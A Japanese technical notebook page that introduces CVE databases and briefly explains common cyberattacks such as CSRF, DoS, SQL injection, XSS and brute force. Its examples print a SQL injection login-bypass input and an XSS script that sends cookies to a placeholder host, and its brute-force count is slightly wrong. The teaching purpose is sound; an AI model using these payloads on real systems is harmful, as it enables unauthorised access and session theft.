---
title: 【IT技術の知見】サイバー攻撃＠セキュリティ
description: サイバー攻撃＠セキュリティの知見を記録しています。
---

# サイバー攻撃＠セキュリティ

## はじめに

本サイトにつきまして、以下をご認識のほど宜しくお願いいたします。

> - https://hiroki-it.github.io/tech-notebook/

<br>

## 01. CVE：Common Vulnerabilities and Exposures)

### CVEとは

報告された脆弱性レポートについて、一意な番号をつけて管理したデータベースのこと。

> - https://www.nic.ad.jp/ja/basics/terms/cve.html
> - https://www.toyo.co.jp/onetech_blog/articles/detail/id=36064

<br>

### CVEのデータベースの種類

#### ▼ GitHub

GitHubで脆弱性に関するIssueが立てられ、これが致命的であると、CVEに掲載される。

GitHub上のOSSのCVEは、GitHub Advisory Databaseで検索できる。

> - https://github.com/advisories

また、各リポジトリのセキュリティの項目で各OSSのCVEを確認できる。

> - https://docs.github.com/ja/code-security/getting-started/adding-a-security-policy-to-your-repository
> - https://github.com/argoproj/argo-cd/security
> - https://github.com/istio/istio/security

#### ▼ GitLab

GitLab上のOSSのCVEは、GitLab Advisory Databaseで検索できる。

> - https://advisories.gitlab.com/

#### ▼ RedHat

RedHat上のOSSのCVEは、RedHat CVEデータベースで検索できる。

> - https://access.redhat.com/security/security-updates/cve

<br>

### その他のデータベース

- NVD
- ICAT

> - https://ja.wikipedia.org/wiki/%E8%84%86%E5%BC%B1%E6%80%A7%E6%83%85%E5%A0%B1%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9

<br>

## 02. サイバー攻撃の種類

### Man In The Middle攻撃 (中間者攻撃)

#### ▼ 中間者攻撃とは

二者間の通信に割り込み、盗聴/改竄/成りすましによって通信を攻撃する。

> - https://www.rapid7.com/ja/fundamentals/man-in-the-middle-mitm-attacks/

<br>

### CSRF：Cross-Site Request Forgeries

#### ▼ CSRFとは

ユーザーがとあるフォームからログイン後、セッションIDを保持したまま悪意のあるサイトに接続したとする。

悪意のあるサイトのサーバーは、ユーザーのセッションIDを使用して、ログインしていた元のサイトのサーバーを攻撃する。

サーバーは、正しいフォームからのリクエストと誤認してしまい、攻撃を許容してしまう。

![csrf](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/csrf.png)

> - https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_6.html

<br>

### セッションID固定化

#### ▼ セッションID固定化とは

記入中...

![session-fixation](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/session-fixation.png)

> - https://www.ipa.go.jp/security/vuln/websecurity-HTML-1_4.html

<br>

### Directory traversal

#### ▼ Directory traversalとは

traversalは、横断する (ディレクトリを乗り越える) の意味。

パス名を使用してファイルを指定し、管理者の意図していないファイルを不正に参照またはダウンロードする。

![ディレクトリトラバーサル](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/ディレクトリトラバーサル.jpg)

<br>

### DoS攻撃：Denial of Service

#### ▼ DoS攻撃、DDos攻撃とは

Webサーバーに大量のリクエストを送信し、障害を起こす手法。

クライアントが1つの場合はDos攻撃、複数の場合はDDos攻撃という。

Dos攻撃はIPアドレスを指定して防御できるが、DDos攻撃はそれができない。

そのため、同一IPアドレスのリクエスト数制限や特定の国を指定したIPアドレス制限が必要になる。

![DoS攻撃](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/DoS攻撃.png)

> - https://ja.m.wikipedia.org/wiki/DoS攻撃

#### ▼ EDos

Webサーバーに大量のリクエストを送信し、クラウドサービスの重量課金額を上げさせる手法。

> - https://ja.m.wikipedia.org/wiki/DoS攻撃

<br>

### SQLインジェクション

#### ▼ SQLインジェクションとは

DBのクエリのパラメーターとなる入力に、不正な文字列を入力して不正なクエリを送信させ、DBの情報を抜き取る手法。

ただし、近年は減少傾向にある。

![SQLインジェクション](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/SQLインジェクション.jpg)

#### ▼ 攻撃例

例えば、アプリの認証ロジックに以下のようなSQLがあるとする。

```sql
SELECT * from USER where USER_NAME = '{user_name}' and PASSWORD = '{password}'
```

この時、ログインの入力フォームに以下を入力する。

- ユーザー名：`foo`
- パスワード： `aaa' or '1' ='1`

これにより、以下のSQLを実行することになる。

```sql
SELECT * from USER where USER_NAME = 'foo' and PASSWORD = 'aaa' or '1' ='1'
```

このSQLは、`'1' ='1'`により`true`となり、処理に成功してしまう。

> - https://zenn.dev/mo_ri_regen/articles/sql-injection

<br>

### XSS：Cross Site Scripting

#### ▼ XSSとは

WebアプリによるHTML出力のエスケープ処理の欠陥を悪用し、利用者のWebブラウザで悪意のあるスクリプトを実行させる手法。

悪意のある第三者が正常なサイトに事前にスクリプトを埋め込み、これを実行してしまったユーザーの情報を盗む。

![cross-cite-scripting](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/cross-cite-scripting.png)

#### ▼ 攻撃例

例えば、複数人が使用する掲示板アプリで、悪意のある人が以下のような投稿をしたとする。

```javascript
<body>
    <p>今日の気分は<script>fetch('https://<Cookieの送信先サイト>/?cookie_data='+document.cookies);</script>だよ</p>
</body>
```

他の人が掲示板アプリを開くと、上記の投稿内のスクリプトが実行される。

スクリプトは、Cookieをサイトに送信する。

> - https://zenn.dev/oreo2990/articles/d33a264b2d8b4c
> - https://www.tohoho-web.com/ex/xss.html

<br>

### パスワードリスト攻撃

#### ▼ パスワードリスト攻撃とは

漏洩したパスワードを使用して、正面から正々堂々とアクセスする手法。

![パスワードリスト攻撃](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/パスワードリスト攻撃.png)

<br>

### Brute-force攻撃とReverse Brute-force攻撃

#### ▼ Brute-force攻撃とReverse Brute-force攻撃とは

Brute-forceは力ずくの意味。IDを固定して、パスワードを総当たりで試す手法。

例えば、5桁数字のパスワードなら、9の5乗通りの組み合わせを試す。

一方で、Reverse Brute-forceは、パスワードを固定して、IDを総当たりで試す手法。

![brute-force-attack_reverse-brute-force-attack](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/brute-force-attack_reverse-brute-force-attack.png)

#### ▼ パスワードのパターン数

記入中...

![パスワードのパターン数](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/パスワードのパターン数.png)

<br>

### レインボー攻撃

#### ▼ レインボー攻撃とは

レインボーテーブルの文字列とハッシュ値の対応関係を元にして、ハッシュ化された暗号からパスワードを推測する手法。

![レインボー攻撃](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/Rainbow攻撃.png)

<br>

### ソーシャルエンジニアリング

#### ▼ ソーシャルエンジニアリングとは

技術的な手法ではなく、物理的な手法 (例：盗み見、盗み聞き、成りすまし、詐欺など) によってパスワードを取得し、アクセスする手法。

![ソーシャルエンジニアリング](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/ソーシャルエンジニアリング.png)

<br>

### 踏み台攻撃

#### ▼ 踏み台攻撃とは

対象のインターネット内のパソコンに攻撃プログラムを仕込んで配置し、攻撃者からの命令でサーバーを攻撃させる手法 (※ボットを使用した攻撃など)

<br>

### DNS Cache Poisoning

#### ▼ DNS Cache Poisoningとは

キャッシュDNSサーバーが持つIPアドレスを偽のIPアドレスに変え、偽のサイトに強制的に接続させる手法。

![DNSキャッシュポイズニング](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/DNSキャッシュポイズニング.gif)

<br>

### Back Door

#### ▼ Back Doorとは

例えば、サイトのカード決済画面やサーバーに潜ませることによって、カード情報を第三者に送信する手法。

![バックドア](https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/バックドア.png)

<br>
